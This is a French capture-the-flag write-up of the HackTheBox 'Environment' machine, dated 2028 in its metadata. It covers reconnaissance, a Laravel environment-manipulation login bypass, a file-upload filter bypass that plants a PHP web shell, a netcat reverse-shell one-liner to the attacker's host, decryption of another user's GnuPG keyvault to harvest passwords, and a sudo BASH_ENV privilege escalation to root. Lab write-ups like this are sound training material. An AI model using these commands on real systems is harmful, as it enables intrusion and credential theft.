---
title: Environment
date: 2028-07-18 00:00:00 +0000
categories: [HackTheBox, Linux]
tags: [htb,medium,web]     # TAG names should always be lowercase
image:
    path: /assets/images_HTB/Environment/Environment.png
---



# Description

**Environment**, nous fait découvrir une chaîne d’attaque complète allant de la phase de reconnaissance des services exposés à la découverte d’une faiblesse applicative, en passant par une prise de contrôle initiale, l’extraction de données sensibles et l’escalade de privilèges jusqu’aux droits root.

## **Recon**

```bash
rustscan -a 10.10.11.67 -- -sCV
```

```bash
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
| 256 5c023395ef44e280cd3a960223f19264 (ECDSA)
| ecdsa-sha2-nistp256
AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrihP7aP61ww7KrHUutuC/GKOyHifRmeM070LMF7b6vguneFJ3do kS/UwZxcp+H82U2LL+patf3wEpLZz1oZdQ=
| 256 1f3dc2195528a17759514810c44b74ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7xeTjQWBwI6WERkd6C7qIKOCnXxGGtesEDTnFtL2f2
80/tcp open http syn-ack ttl 63 nginx 1.22.1
|_http-title: Did not follow redirect to http://environment.htb
|_http-server-header: nginx/1.22.1
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# **etc/hosts**

Le scan précédant nous révèle un nom de domaine que nous allons ajouter dans notre fichier `hosts`

```bash
echo "10.10.11.67 environment.htb" >> /etc/hosts
```

# **SSH-22**

![](/assets/images_HTB/Environment/image2.png)

Authentication avec password est autorisé donc possible attaquer par brute force

# **HTTP-80**

Enumeration des sous répertoire du site avec [dirsearch](https://github.com/maurosoria/dirsearch)

```bash
dirsearch -u http://environment.htb/
```

![](/assets/images_HTB/Environment/image3.png)

dirsearch nous révèle une page de login présente sur le site

![](/assets/images_HTB/Environment/image4.png)

## **Remember**

En interceptant la request de login avec [**Burp Suite**](https://fr.wikipedia.org/wiki/Burp_Suite) tout en modifiant la variable `remember` avec un champ vide une partie du code de l’application s’affiche

![](/assets/images_HTB/Environment/image5.png)

Le code de l'app ne prend en compte que 2 valeur de la variable remember sans gérer les exception

![](/assets/images_HTB/Environment/image6.png)

Nous avons maintenant la version de Laravel utilisée

# **Vulnérabilité**

![](/assets/images_HTB/Environment/image7.png)

La manipulation de la variable `environment` peu permet de de nous connecter directement. Notre version de laravel est [vulnérable](https://www.cybersecurity-help.cz/vdb/SB20241112127) à une [**Environment manipulation**](https://medium.com/@moaminsharifi/is-your-laravel-application-at-risk-the-register-argc-argv-vulnerability-explained-607cc2e6a4d5)

Il ne nous reste plus qu’a intercepter la request de login puis ajouter notre payload

![](/assets/images_HTB/Environment/image8.png)

# Connexion

Page de connexion Mailing

![](/assets/images_HTB/Environment/image9.png)

# **Upload**

![](/assets/images_HTB/Environment/image10.png)

Nous pouvons ajouter une nouvelle image de profile. Essayons de bypasser les filtres pour avoir un shell. Premièrement modifier le filename qui se ternime par un point(.) puis le Content-Type pour `image/jgp`  et en suite mettre GIF89a avant le code php pour fausser la signature du fichier

![](/assets/images_HTB/Environment/image11.png)

Le chemain vers le fichier php est donné par la réponse de la request

![](/assets/images_HTB/Environment/image12.png)

# Test de fonctionnement

![](/assets/images_HTB/Environment/image13.png)

# **Revershelle**

Lancement d'un listener sur le port 9001 puis execution de la commande suivant dans notre cmd php

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.xx.xx port >/tmp/f
```

![](/assets/images_HTB/Environment/image14.png)

# **Encrypted**

Le répertoire personnel de hish contient [gnupg](https://www.gnupg.org/) et `backup` ****contenant un `keyvault` protègent dans donnée intéressante

- **`cp -r /home/hish/.gnupg /tmp/gnupg`**
    
    Copie récursivement le répertoire de configuration GnuPG de l’utilisateur `hish` vers `/tmp/gnupg` car nous n’avons pas les pleins droits sur ce répertoire et son contenu
    
- **`chmod 700 /tmp/gnupg/`**
    
    Change les permissions du dossier copié pour que seul le propriétaire puisse y accéder, comme l’exige GnuPG pour des raisons de sécurité.
    
- **`gpg --homedir /tmp/gnupg/ --list-secret-keys`**
    
    Indique à GnuPG d’utiliser `/tmp/gnupg` comme répertoire de clés (`--homedir`) et affiche la liste des clés privées s’y trouvant, sans toucher à votre configuration principale.
    
- **`gpg --homedir /tmp/gnupg/ --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg`**
    
    Toujours en mode “répertoire alternatif”, déchiffre le fichier chiffré `keyvault.gpg` et écrit le résultat clair dans `/tmp/message.txt`.
    

# SSH

Nous possédons maintenant un ensemble de clé appartenant à hish qui peuvent servir pour la connexion ssh

![](/assets/images_HTB/Environment/image15.png)

Un des password nous permet effectivement d’avoir une session ssh

![](/assets/images_HTB/Environment/image16.png)

# **Prevesc**

![](/assets/images_HTB/Environment/image17.png)

L’exécution de la commande `sudo -l` montre la possibilité d’exciter avec les droits sudo `/usr/bin/systeminfo` ajouté à la variable d’environnement BASH_ENV que l'on peut modifier.

# **Exploit**

Crée dans un premier temps un fichier en bash contenant notre commande puis on le rend exécutable

```bash
echo "bash -p" > get_root.sh
chmod +x get_root.sh
sudo BASH_ENV=./get_root.sh /usr/bin/systeminfo
```

![](/assets/images_HTB/Environment/image18.png)

Et Nous somme `ROOT`